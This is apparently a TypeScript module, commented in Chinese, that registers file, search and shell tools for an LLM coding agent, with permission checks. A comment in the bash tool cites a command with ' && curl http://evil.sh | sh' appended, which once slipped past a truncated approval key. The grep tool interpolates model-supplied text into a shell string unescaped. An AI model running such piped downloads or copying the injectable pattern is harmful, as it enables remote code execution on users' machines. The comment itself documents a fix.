/**
 * 内置工具注册 —— Ls / Read / Write / Edit / Grep / Bash 六个核心工具。
 * 调用方：main.ts（组装工具子系统时调用）
 * 服务于：为 LLM 提供列目录、读文件、写文件、精准改片段、搜索内容、执行命令的能力
 *         （Ls 支撑"工具增强推理"：模型先看清项目结构再动手，不凭记忆脑补）
 *
 * 设计原则：
 * 1. 参数名只认规范名，不搞多别名（结构化 function calling 由 API 保证参数格式）
 * 2. 每个参数有明确的类型约束和示例值
 * 3. 输出格式统一为 `[状态标识] 描述\n详情`
 * 4. 输入参数做运行时校验，非法参数不执行
 * 5. 改类工具拿不准时**拒绝且一字不落盘**，把原因回给模型让它重试：
 *    静默改错地方比拒绝一次的代价大得多（edit 的 0 命中与多命中两条拒绝路径即此原则）
 */
import type { ToolProvider } from '../core/tools.js';

/* ═══════════════════════════════════════════════════════════════════════════════
   参数提取与校验
   统一处理：取规范参数名 → 类型转换 → 范围校验
   ═══════════════════════════════════════════════════════════════════════════════ */

class ToolInputError extends Error {
  code: string;
  constructor(code: string, message: string) {
    super(message);
    this.code = code;
    this.name = 'ToolInputError';
  }
}

/** 提取字符串参数，校验非空 */
function requireString(args: Record<string, unknown>, key: string, label: string): string {
  const val = args[key];
  if (val === undefined || val === null) throw new ToolInputError('missing', `${label} (${key}) 是必填参数`);
  const str = String(val);
  if (!str.trim()) throw new ToolInputError('empty', `${label} (${key}) 不能为空`);
  return str;
}

/** 提取可选字符串，无值时返回默认值 */
function optionalString(args: Record<string, unknown>, key: string, defaultVal: string): string {
  const val = args[key];
  if (val === undefined || val === null) return defaultVal;
  return String(val);
}

/** 提取可选正整数 */
function optionalPositiveInt(args: Record<string, unknown>, key: string, label: string, defaultVal: number): number {
  const val = args[key];
  if (val === undefined || val === null) return defaultVal;
  const num = Number(val);
  if (!Number.isInteger(num) || num < 1) throw new ToolInputError('invalid_range', `${label} (${key}) 必须是正整数`);
  return num;
}

/**
 * 提取必填字符串，但**允许空串**（与 requireString 的唯一差别：不校验非空）。
 * 用于 edit 的 newText：空串表示"删掉这一段"，是合法意图，不能当缺参拒绝。
 * 键不存在仍按缺参报错，避免模型漏传时静默把内容删光。
 */
function requireStringAllowEmpty(args: Record<string, unknown>, key: string, label: string): string {
  const val = args[key];
  if (val === undefined || val === null) {
    throw new ToolInputError('missing', `${label} (${key}) 是必填参数（删除内容请显式传空字符串）`);
  }
  return String(val);
}

/* ═══════════════════════════════════════════════════════════════════════════════
   工具注册
   ═══════════════════════════════════════════════════════════════════════════════ */

export function registerBuiltinTools(tools: ToolProvider): void {
  /* ── Ls：列目录（了解结构，工具增强推理的起点） ── */
  tools.register({
    name: 'ls',
    description: '列出目录内容，了解项目/目录结构（动手前先看清结构）。目录项以 / 结尾。默认只列当前层，depth 可递归。跳过 .git/node_modules/dist 等噪音目录。',
    parameters: {
      type: 'object',
      properties: {
        path: {
          type: 'string',
          description: '目录路径，默认当前目录。示例: "src/" 或 "C:/Users/name/project"',
        },
        depth: {
          type: 'number',
          description: '递归深度（1=仅当前层）。默认 1。示例: 2 列出两层',
        },
      },
    },
    handler: async (args) => {
      try {
        const path = optionalString(args, 'path', '.');
        const depth = optionalPositiveInt(args, 'depth', '递归深度', 1);

        const { existsSync, statSync, readdirSync } = await import('node:fs');
        const resolvedPath = path.replace(/\\/g, '/');

        if (!existsSync(resolvedPath)) {
          return `[NOT_FOUND] 目录不存在: ${resolvedPath}`;
        }
        if (!statSync(resolvedPath).isDirectory()) {
          return `[NOT_DIR] 不是目录: ${resolvedPath}`;
        }

        // 递归列目录（目录名带 / 后缀；跳过噪音目录；限制条目数防膨胀）
        const SKIP = new Set(['.git', 'node_modules', 'dist']);
        const MAX_ENTRIES = 200;
        const lines: string[] = [];
        const walk = (dir: string, level: number): void => {
          if (level > depth || lines.length >= MAX_ENTRIES) return;
          let items;
          try {
            items = readdirSync(dir, { withFileTypes: true });
          } catch {
            return; // 无权限等 → 跳过该目录
          }
          items.sort((a, b) => {
            if (a.isDirectory() !== b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.name.localeCompare(b.name);
          });
          for (const item of items) {
            if (lines.length >= MAX_ENTRIES) return;
            if (item.name.startsWith('.') || SKIP.has(item.name)) continue;
            const prefix = '  '.repeat(level - 1);
            const isDir = item.isDirectory();
            lines.push(`${prefix}- ${item.name}${isDir ? '/' : ''}`);
            if (isDir) walk(`${dir}/${item.name}`, level + 1);
          }
        };
        walk(resolvedPath, 1);

        if (lines.length === 0) {
          return `[EMPTY] 目录为空或全部被过滤: ${resolvedPath}`;
        }
        const count = lines.length;
        return `[OK] 目录 ${resolvedPath} (${count} 项${count >= MAX_ENTRIES ? ', 已达上限截断' : ''}):\n${lines.join('\n')}`;
      } catch (e) {
        if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
        return `[ERROR] 列目录失败: ${e instanceof Error ? e.message : String(e)}`;
      }
    },
  });

  /* ── Read：读文件 ── */
  tools.register({
    name: 'read',
    description: '读取文件内容。可指定行范围分段读取大文件。路径用 / 或 \\\\，如 "C:/Users/name/file.txt" 或 "src/utils/helper.ts"。',
    parameters: {
      type: 'object',
      properties: {
        path: {
          type: 'string',
          description: '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/file.txt" 或 "src/data/config.json"',
        },
        offset: {
          type: 'number',
          description: '起始行号，从 1 开始。默认 1。示例: 10 （从第 10 行开始读）',
        },
        limit: {
          type: 'number',
          description: '读取行数。默认不限制。示例: 50 （最多读 50 行）',
        },
      },
      required: ['path'],
    },
    handler: async (args) => {
      try {
        const path = requireString(args, 'path', '文件路径');
        const offset = optionalPositiveInt(args, 'offset', '起始行号', 1);
        const limit = optionalPositiveInt(args, 'limit', '读取行数', Number.MAX_SAFE_INTEGER);

        const { readFileSync, existsSync, statSync } = await import('node:fs');
        const resolvedPath = path.replace(/\\/g, '/');

        if (!existsSync(resolvedPath)) {
          return `[NOT_FOUND] 文件不存在: ${resolvedPath}`;
        }
        if (!statSync(resolvedPath).isFile()) {
          return `[NOT_FILE] 不是文件: ${resolvedPath}`;
        }

        const content = readFileSync(resolvedPath, 'utf-8');
        const lines = content.split('\n');
        const start = Math.max(0, offset - 1);
        const count = Math.min(limit, lines.length - start);
        const selected = lines.slice(start, start + count);
        const output = selected.map((line, i) => `${start + i + 1} | ${line}`).join('\n');

        return `[OK] 文件 ${resolvedPath} (${lines.length} 行) 行 ${offset}-${offset + count - 1}:\n${output}`;
      } catch (e) {
        if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
        return `[ERROR] 读取失败: ${e instanceof Error ? e.message : String(e)}`;
      }
    },
  });

  /* ── Write：写文件 ── */
  tools.register({
    name: 'write',
    description: '创建新文件或整篇覆盖已有文件的内容。自动创建不存在的父目录。只改文件里的一小段请用 edit（不必重抄全文，也不会误伤未改动的部分）。路径用 / 或 \\\\。',
    requirePermission: true,
    parameters: {
      type: 'object',
      properties: {
        path: {
          type: 'string',
          description: '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/output.txt" 或 "src/data/config.json"',
        },
        content: {
          type: 'string',
          description: '要写入的文件完整内容。会完全覆盖已存在的文件。示例: "{\\n  \\"name\\": \\"test\\"\\n}"',
        },
      },
      required: ['path', 'content'],
    },
    // 授权边界 = 目标文件。刻意不含 content：内容每次都不同，塞进键里会让"本次全部允许"
    // 退化成"只允许这一次"。反斜杠归一，免得 `src\x.ts` 与 `src/x.ts` 算成两个键。
    permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
    handler: async (args) => {
      try {
        const path = requireString(args, 'path', '文件路径');
        const content = requireString(args, 'content', '文件内容');

        const { writeFileSync, readFileSync, mkdirSync, existsSync } = await import('node:fs');
        const { dirname } = await import('node:path');
        const resolvedPath = path.replace(/\\/g, '/');
        const dir = dirname(resolvedPath);

        if (!existsSync(dir)) {
          mkdirSync(dir, { recursive: true });
        }

        writeFileSync(resolvedPath, content, 'utf-8');

        // 写回验证
        const verified = readFileSync(resolvedPath, 'utf-8');
        if (verified !== content) {
          return `[VERIFY_FAILED] 写入内容与读取内容不一致: ${resolvedPath}`;
        }

        const lineCount = content.split('\n').length;
        return `[OK] 写入成功: ${resolvedPath} (${content.length} 字符, ${lineCount} 行)`;
      } catch (e) {
        if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
        return `[ERROR] 写入失败: ${e instanceof Error ? e.message : String(e)}`;
      }
    },
  });

  /* ── Edit：精准替换文件片段（改局部用它，不要 write 重抄全文） ── */
  tools.register({
    name: 'edit',
    description: '精准替换文件中的一段文本，用于局部修改（改一行、改一个函数、改一处配置）。oldText 必须与文件里的原文逐字符一致（缩进、空格、标点全算）且在文件中唯一；找不到或命中多处时本工具会拒绝并回报原因，文件一字不动。新建文件或整篇重写才用 write。路径用 / 或 \\\\。',
    requirePermission: true,
    parameters: {
      type: 'object',
      properties: {
        path: {
          type: 'string',
          description: '文件路径，绝对路径或相对当前工作目录。示例: "src/tools/builtin.ts"',
        },
        oldText: {
          type: 'string',
          description: '要被替换的原文片段，逐字符照抄文件里的内容（缩进与空格全算）。不确定就先用 read 看清原文，不要凭记忆填。片段要带足够上下文以保证在文件中唯一。示例: "const count = 1;"',
        },
        newText: {
          type: 'string',
          description: '替换后的新文本。传空字符串表示删掉 oldText 这一段。示例: "const count = 2;"',
        },
        replaceAll: {
          type: 'boolean',
          description: '命中多处时是否全部替换。默认 false，即多命中直接拒绝并回报候选行号。仅在确认每一处都该改成同样内容时才传 true。示例: false',
        },
      },
      required: ['path', 'oldText', 'newText'],
    },
    // 授权边界 = 目标文件。刻意不含 oldText/newText：两段文本每次都不同，塞进键里会让
    // "本次全部允许"退化成"只允许这一次"；而只截前 N 字符更糟——那正是本轮修掉的静默扩权
    // （同一文件里 oldText 开头相同的两次调用会共用一次授权，newText 改成什么都放行）。
    permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
    // 弹窗文案自定义（core ToolDefinition 的可选成员）：默认的 args JSON 前 80 字符会被
    // path 与 oldText 占满，用户在弹窗里看不出要改什么。硬约束：必须单行——selector 的标题
    // 只占 1 行、每行过 fitWidth 截断，文案里带 \n 会多出一个物理行，把"固定行数 + 回退清行"
    // 算错 → 选择器漂移。所以下面 flat() 把所有空白（含换行）压成单个空格。
    permissionDetail: (args) => {
      const target = String(args.path ?? '?').replace(/\\/g, '/');
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);
      const all = String(args.replaceAll) === 'true' ? '（全部）' : '';
      return `改 ${target}: ${clip(flat(args.oldText), 20)} → ${clip(flat(args.newText), 20)}${all}`;
    },
    handler: async (args) => {
      try {
        const path = requireString(args, 'path', '文件路径');
        const oldText = requireString(args, 'oldText', '原文片段');
        const newText = requireStringAllowEmpty(args, 'newText', '新文本');
        const replaceAll = String(args.replaceAll) === 'true';
        const resolvedPath = path.replace(/\\/g, '/');

        // 新旧文本相同：不落盘、不报成功，直接回一句无效（省掉无谓的写与验证）
        if (oldText === newText) {
          return `[INVALID] oldText 与 newText 完全相同，无需改动: ${resolvedPath}`;
        }

        const { readFileSync, writeFileSync, existsSync, statSync } = await import('node:fs');

        if (!existsSync(resolvedPath)) {
          return `[NOT_FOUND] 文件不存在: ${resolvedPath}（新建文件请用 write）`;
        }
        if (!statSync(resolvedPath).isFile()) {
          return `[NOT_FILE] 不是文件: ${resolvedPath}`;
        }

        // 按字节读，不按 'utf-8' 读字符串：BOM 判定与写回验证都落在字节上。
        // 实测 Node v24.12.0 用 utf-8 读**不剥** BOM（\uFEFF 会留在串首），但这是随时可能
        // 变的行为细节，不该当设计依据——自己读字节、自己判头三字节，BOM 的保真就与 Node
        // 版本无关；写回也因此能直接按字节 equals 验证，不经二次编解码。
        const buf = readFileSync(resolvedPath);
        const hasBom = buf[0] === 0xef && buf[1] === 0xbb && buf[2] === 0xbf;
        const decoded = buf.toString('utf-8');
        const original = hasBom ? decoded.slice(1) : decoded;

        // 行尾保持：纯 CRLF 文件（Windows 上 git core.autocrlf=true 检出的源码就是这样）里，
        // 模型发来的 oldText 几乎必然用 \n，直接匹配必然 0 命中 —— 工具会在最需要它的地方失效。
        // 做法：在 \n 归一化副本上匹配与替换，写回前整体还原成 CRLF。
        // 只对"纯 CRLF"做这层往返：混合行尾的文件按字面匹配（宁可拒绝，也不做波及全文的还原）。
        const crlfCount = (original.match(/\r\n/g) ?? []).length;
        const lfCount = (original.match(/\n/g) ?? []).length;
        const allCrlf = crlfCount > 0 && crlfCount === lfCount;
        const work = allCrlf ? original.replace(/\r\n/g, '\n') : original;

        // 数命中：indexOf 循环 + 字面切片拼接，不用正则——oldText 里满是 . * ( [ ? 这类元字符，
        // 走正则就得转义，转义就有漏转的风险（漏一个就把"改这一处"变成"改一片"）。
        // 步进 oldText.length 而非 1：不重复计重叠命中，与 replaceAll 的语义一致。
        const hits: number[] = [];
        for (let i = work.indexOf(oldText); i !== -1; i = work.indexOf(oldText, i + oldText.length)) {
          hits.push(i);
        }

        // 状态前缀的选择是**承重的**，不要"为一致性"改成 [NO_MATCH] / [INVALID]：
        // agent-loop 只把 [ERROR] / [VERIFY_FAILED] 记作失败，而"重复失败保护"只在失败时计数，
        // 第 2 次同样调用就会追加 [系统提示] 叫模型停止原样重试、先去 read 确认。
        // 定位失败（0 命中 / 多命中）恰恰是最容易被原样重试的一类，用软前缀等于把这层保护关掉。
        // 反之 [NOT_FOUND]（目标文件不存在）保持与 read/write 一致的有效否定语义。
        if (hits.length === 0) {
          return `[ERROR] oldText 在文件中找不到，未做任何改动: ${resolvedPath}\n`
            + `文件共 ${work.split('\n').length} 行。oldText 必须与文件内容逐字符一致（缩进、空格、标点全算）。\n`
            + `先用 read 看清原文再重试，不要凭记忆猜。`;
        }

        if (hits.length > 1 && !replaceAll) {
          // 拒绝而不是"改第一处"：猜是最危险的行为——它会静默改错地方，模型和用户都看不出来。
          const lineOf = (idx: number): number => work.slice(0, idx).split('\n').length;
          const shown = hits.slice(0, 20).map(lineOf);
          const more = hits.length > shown.length ? `（仅列出前 ${shown.length} 处）` : '';
          return `[ERROR] oldText 命中 ${hits.length} 处，无法确定该改哪一处，未做任何改动: ${resolvedPath}\n`
            + `候选行号: 第 ${shown.join(', ')} 行${more}\n`
            + `给 oldText 加上下文使其唯一；确认每一处都要改成同样内容时，才传 replaceAll: true。`;
        }

        const updated = replaceAll
          ? work.split(oldText).join(newText)
          : work.slice(0, hits[0]) + newText + work.slice(hits[0] + oldText.length);

        // 还原行尾与 BOM 后整体写回：未命中的部分必须与原文逐字节相同
        const payload = (hasBom ? '\uFEFF' : '') + (allCrlf ? updated.replace(/\n/g, '\r\n') : updated);
        writeFileSync(resolvedPath, payload, 'utf-8');

        // 写回验证按字节比：不依赖"编码读会不会吃 BOM"这类行为细节
        if (!readFileSync(resolvedPath).equals(Buffer.from(payload, 'utf-8'))) {
          return `[VERIFY_FAILED] 写回内容与读取内容不一致: ${resolvedPath}`;
        }

        const before = work.split('\n').length;
        const after = updated.split('\n').length;
        const delta = after - before;
        return `[OK] 已替换 ${replaceAll ? hits.length : 1} 处: ${resolvedPath} `
          + `(${before} → ${after} 行${delta === 0 ? '' : `, ${delta > 0 ? '+' : ''}${delta}`}, `
          + `${original.length} → ${updated.length} 字符${allCrlf ? ', CRLF 已保持' : ''}${hasBom ? ', BOM 已保持' : ''})`;
      } catch (e) {
        if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
        return `[ERROR] 替换失败: ${e instanceof Error ? e.message : String(e)}`;
      }
    },
  });

  /* ── Grep：搜索文件内容 ── */
  tools.register({
    name: 'grep',
    description: '在文件中搜索文本或正则模式，返回匹配行及行号。基于 ripgrep (rg) 或系统 grep。',
    parameters: {
      type: 'object',
      properties: {
        pattern: {
          type: 'string',
          description: '搜索模式，支持正则表达式。特殊字符请转义。示例: "function\\s+\\w+" 或 "TODO|FIXME" 或 "console\\.log"',
        },
        path: {
          type: 'string',
          description: '搜索路径，文件或目录。默认当前目录。示例: "src/" 或 "C:/Users/name/project"',
        },
        include: {
          type: 'string',
          description: '文件类型过滤 glob 模式。示例: "*.ts" 或 "*.{ts,js,json}" 或 "*.txt"',
        },
      },
      required: ['pattern'],
    },
    handler: async (args) => {
      try {
        const pattern = requireString(args, 'pattern', '搜索模式');
        const searchPath = optionalString(args, 'path', '.');
        const glob = optionalString(args, 'include', '');

        const { execSync } = await import('node:child_process');
        const resolvedPath = searchPath.replace(/\\/g, '/');
        const globFlag = glob ? `--glob "${glob}"` : '';
        const cmd = `grep -rn --binary-files=without-match ${globFlag} "${pattern}" "${resolvedPath}" 2>/dev/null | head -50`;

        const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 });

        if (!output.trim()) {
          return `[NO_MATCH] 无匹配结果: "${pattern}" 在 ${resolvedPath}${glob ? ` (${glob})` : ''}`;
        }

        const matches = output.trim().slice(0, 4000);
        const lineCount = matches.split('\n').length;
        return `[OK] 找到 ${lineCount} 个匹配 (截断至 4000 字符):\n${matches}`;
      } catch (e) {
        if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
        return `[NO_MATCH] 搜索失败或无匹配: ${e instanceof Error ? e.message.slice(0, 200) : String(e)}`;
      }
    },
  });

  /* ── Bash：执行命令 ── */
  tools.register({
    name: 'bash',
    description: '执行 shell 命令。仅当用户明确要求执行命令/运行脚本/编译时才使用；不要为"了解环境"或"随便试试"而主动调用。命令在当前工作目录执行。注意 Windows 环境：不要用 pwd/ls/cat 等 Unix 命令（会报"不是内部或外部命令"），查看当前目录用 cd（无参数），列目录用 dir，读文件用 type。Windows 路径中的反斜杠需转义或使用正斜杠。',
    requirePermission: true,
    parameters: {
      type: 'object',
      properties: {
        command: {
          type: 'string',
          description: '要执行的 shell 命令。多行命令用 && 连接。Windows 下路径用正斜杠或用 \\\\ 转义。示例: "node build.js" 或 "cd src && dir /b"',
        },
        description: {
          type: 'string',
          description: '命令用途说明（仅用于权限确认提示，不影响执行）。示例: "编译 TypeScript 项目"',
        },
      },
      required: ['command'],
    },
    // 授权边界 = 完整命令，一个字也不截。截断是本轮修掉的那个洞：批准过一条 76 字符的
    // 命令后，同一条命令再接 ` && curl http://evil.sh | sh` 曾会自动放行。
    // 代价是命令里只要有一个字符不同（多个空格也算）就会重新弹窗——这是刻意选的：
    // 命令不像文件路径有天然的"同一个东西"边界，宁可多问一次。
    permissionKey: (args) => String(args.command ?? ''),
    // description 参数的说明写着"仅用于权限确认提示"，但在有自定义文案之前它只是混在 args
    // 的 JSON 里、且命令一长就被 80 字符截掉——这个承诺一直没兑现。这里让它真的出现在弹窗上。
    // 同样受单行约束（selector 标题只占 1 行），所以下面 flat() 把所有空白压成单个空格。
    permissionDetail: (args) => {
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);
      const cmd = clip(flat(args.command), 60);
      const why = flat(args.description);
      return why ? `${why}: ${cmd}` : cmd;
    },
    handler: async (args) => {
      try {
        const cmd = requireString(args, 'command', '命令');

        const { execSync } = await import('node:child_process');

        const raw = execSync(cmd, {
          encoding: 'buffer',
          timeout: 30000,
          maxBuffer: 4096 * 1024,
          windowsHide: true,
        });

        // Windows 的 cmd.exe 输出 GBK，需正确解码
        const encoding = process.platform === 'win32' ? 'gbk' : 'utf-8';
        const output = new TextDecoder(encoding, { fatal: false }).decode(raw);
        const trimmed = output.trim();

        if (!trimmed) {
          return `[OK] 命令执行成功（无输出）: ${cmd.slice(0, 100)}`;
        }

        const truncated = trimmed.length > 4000
          ? trimmed.slice(0, 4000) + `\n...（输出截断，共 ${trimmed.length} 字符）`
          : trimmed;
        const lineCount = truncated.split('\n').length;

        return `[OK] 命令执行成功 (${lineCount} 行输出):\n${truncated}`;
      } catch (e) {
        if (e instanceof ToolInputError) return `[INVALID] ${e.message}`;
        const msg = e instanceof Error ? e.message.slice(0, 500) : String(e);
        return `[ERROR] 命令执行失败: ${msg}`;
      }
    },
  });
}
